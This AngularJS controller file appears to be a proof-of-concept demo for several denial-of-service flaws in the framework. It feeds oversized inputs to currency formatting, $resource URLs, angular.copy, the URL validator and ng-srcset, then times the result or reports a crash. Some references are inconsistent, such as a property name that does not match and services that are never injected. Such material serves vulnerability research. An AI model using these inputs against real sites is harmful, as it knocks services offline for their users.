// Create the module where our functionality can attach to
let appModule = angular.module('app', []);



// Controllers
appModule.component('appComponent', {
  templateUrl: 'app/app.template.html',
  controller: controller,
});

controller.$inject = ['$locale', '$timeout', '$resource', '$timeout']
function controller($locale, $timeout, $resource, $timeout) {
  'ngInject';
  const ctrl = this;
  ctrl.currencySymbol = '$';
  ctrl.amount = 100;
  ctrl.posPre = $locale.NUMBER_FORMATS.PATTERNS[1].posPre;
  ctrl.ngSrcSetDdos = 'https://placehold.co/600x400,'


  ctrl.onPosPreChange = () => {
    $locale.NUMBER_FORMATS.PATTERNS[1].posPre = ctrl.posPre;
    const amount = ctrl.amount;
    ctrl.amount = 0;
    $timeout(() => (ctrl.amount = amount));
  };

  ctrl.onReDos = () => {
    ctrl.currencySymbol = '';
    ctrl.posPre = ' '.repeat(1000000);
    $locale.NUMBER_FORMATS.PATTERNS[1].posPre = ctrl.posPre;
  };

  ctrl.query = () => {
    let resourceExpoit = $resource(`https://example.com/something/foo${'/'.repeat(100000)}bar`, {}, {}, { cancellable: true, });
    resourceExpoit.query()
  }

  ctrl.angularCopy = () => {
    let a = new RegExp('x'.repeat(1000000))
    angular.copy(a)
  }

  ctrl.validator = () => {
    ctrl.url = `scheme:${'/'.repeat(1000000)}`; 
    ctrl.urlInputController = ctrl.urlInput.controller('ngModel');
    let urlInputValidators = ctrl.urlInputController.$validators;
    ctrl.urlInputController.$validators = {};

    $timeout(() => {
      ctrl.urlInputController.$validators = urlInputValidators;
      ctrl.urlInputController.$validate();
    }, 1000)
  }

  ctrl.ngSrcSetDdosNow = () => {
    try {
        ctrl.ngSrcSetDdos = 'https://placehold.co/600x400, ' + ' '.repeat(2 ** 30)
        this.ngSrcSetCompiledElem.html(`<img ng-srcset="${this.ngSrcSet}">`);
        const scope = this.ngSrcSetCompiledElem.scope();

        const start = performance.now();
        this.$compile(this.ngSrcSetCompiledElem)(scope);
        this.$rootScope.$apply();
        const end = performance.now();

        this.duration = `${((end - start) / 1000).toFixed(2)} seconds`;
      } catch (err) {
        console.error(err);

        this.duration = '(APP CRASHED)';
      } finally {
        this.$rootScope.$apply(); // apply the duration change
      }
  }

}
